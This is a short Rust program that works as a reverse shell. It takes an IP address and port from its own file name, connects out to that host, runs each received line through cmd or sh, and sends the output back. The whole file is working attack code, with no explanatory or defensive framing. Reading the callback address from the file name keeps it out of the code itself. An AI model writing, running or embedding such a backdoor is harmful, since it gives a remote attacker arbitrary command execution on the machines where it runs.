use std::env;
use std::net::TcpStream;
use std::process::Command;
use std::io::{self, Write, Read};

fn main() -> io::Result<()> {
    let current_exe = env::current_exe()?;
    let filename = current_exe.file_name().unwrap().to_str().unwrap();

    let parts: Vec<&str> = filename.split('_').collect();
    let ip = format!("{}.{}.{}.{}", parts[0], parts[1], parts[2], parts[3]);
    let port = parts[4];

    let address = format!("{}:{}", ip, port);

    if let Ok(mut stream) = TcpStream::connect(&address) {
        loop {
            let mut buffer = [0; 1024];
            let n = stream.read(&mut buffer)?;

            if n == 0 {
                break;
            }

            let output = if cfg!(target_os = "windows") {
                Command::new("cmd")
                    .args(&["/C", std::str::from_utf8(&buffer[..n]).unwrap()])
                    .output()
            } else {
                Command::new("sh")
                    .arg("-c")
                    .arg(std::str::from_utf8(&buffer[..n]).unwrap())
                    .output()
            };

            if let Ok(output) = output {
                stream.write_all(&output.stdout)?;
                stream.write_all(&output.stderr)?;
            }
        }
    }

    Ok(())
}
